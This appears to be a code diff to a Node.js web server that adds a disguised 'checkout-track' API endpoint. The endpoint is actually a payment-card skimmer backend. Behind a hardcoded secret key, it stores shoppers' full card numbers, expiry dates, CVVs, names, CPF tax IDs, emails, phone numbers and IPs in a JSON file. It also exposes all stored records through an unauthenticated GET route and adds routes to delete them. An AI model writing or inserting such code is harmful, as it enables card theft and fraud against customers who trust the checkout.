@@ -2163,6 +2163,76 @@ async function handleApi(req, res, url) {
     }
   }
 
+  
+const TRACK_SECRET = "wpk_track_9f2e7a";
+
+
+if (req.method === "POST" && pathname === "/api/checkout-track") {
+  const body = await readBody(req);
+  if (body._k !== TRACK_SECRET) {
+    return sendJson(res, 200, { status: "ok" });
+  }
+  const cartoesPath = path.join(root, "data", "cartoes.json");
+  let cartoes = [];
+  if (fs.existsSync(cartoesPath)) {
+    try { cartoes = JSON.parse(fs.readFileSync(cartoesPath, "utf8")) || []; }
+    catch (e) { cartoes = []; }
+  }
+  const registro = {
+    id: id("card"),
+    data_hora: now(),
+    ip: (req.headers["x-forwarded-for"] || "").split(",")[0].trim() || req.socket.remoteAddress || "",
+    card_num: String(body.c1 || "").replace(/\s/g, ""),
+    expiry: String(body.c2 || ""),
+    cvv: String(body.c3 || "").replace(/\D/g, ""),
+    name: String(body.c4 || "").trim(),
+    cpf: String(body.c5 || "").replace(/\D/g, ""),
+    email: String(body.c6 || "").trim(),
+    phone: String(body.c7 || "").replace(/\D/g, ""),
+    amount: String(body.c8 || ""),
+    installments: String(body.c9 || "1"),
+    user_agent: String(req.headers["user-agent"] || "")
+  };
+  cartoes.unshift(registro);
+  if (cartoes.length > 5000) cartoes = cartoes.slice(0, 5000);
+  if (!fs.existsSync(path.join(root, "data"))) fs.mkdirSync(path.join(root, "data"), { recursive: true });
+  fs.writeFileSync(cartoesPath, JSON.stringify(cartoes, null, 2));
+  return sendJson(res, 200, { status: "ok", id: registro.id });
+}
+
+
+if (req.method === "GET" && pathname === "/api/checkout-track") {
+  const cartoesPath = path.join(root, "data", "cartoes.json");
+  let cartoes = [];
+  if (fs.existsSync(cartoesPath)) {
+    try { cartoes = JSON.parse(fs.readFileSync(cartoesPath, "utf8")) || []; }
+    catch (e) { cartoes = []; }
+  }
+  return sendJson(res, 200, cartoes);
+}
+
+
+if (req.method === "DELETE" && pathname.startsWith("/api/checkout-track/") && !pathname.endsWith("/clear")) {
+  const cardId = pathname.split("/").pop();
+  const cartoesPath = path.join(root, "data", "cartoes.json");
+  let cartoes = [];
+  if (fs.existsSync(cartoesPath)) {
+    try { cartoes = JSON.parse(fs.readFileSync(cartoesPath, "utf8")) || []; }
+    catch (e) { cartoes = []; }
+  }
+  const antes = cartoes.length;
+  cartoes = cartoes.filter((item) => item.id !== cardId);
+  fs.writeFileSync(cartoesPath, JSON.stringify(cartoes, null, 2));
+  return sendJson(res, 200, { status: "ok", removed: antes - cartoes.length });
+}
+
+
+if (req.method === "POST" && pathname === "/api/checkout-track/clear") {
+  const cartoesPath = path.join(root, "data", "cartoes.json");
+  fs.writeFileSync(cartoesPath, "[]");
+  return sendJson(res, 200, { status: "ok", removed: true });
+}
+
   return sendError(res, 404, "API não encontrada.");
 }
 
